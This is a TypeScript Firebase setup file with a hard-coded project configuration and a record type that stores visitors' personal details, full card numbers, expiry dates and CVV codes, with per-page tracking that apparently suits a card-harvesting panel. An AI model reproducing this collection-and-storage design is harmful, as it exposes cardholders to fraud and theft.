import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyACyKItfyP7-ebn2n6vKIl11S7P_TKPhko",
  authDomain: "cares-main-m.firebaseapp.com",
  databaseURL: "https://cares-main-m-default-rtdb.firebaseio.com",
  projectId: "cares-main-m",
  storageBucket: "cares-main-m.firebasestorage.app",
  messagingSenderId: "777492774598",
  appId: "1:777492774598:web:855835b3d8c79a589f21c7",
  measurementId: "G-HLJC35394P"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}




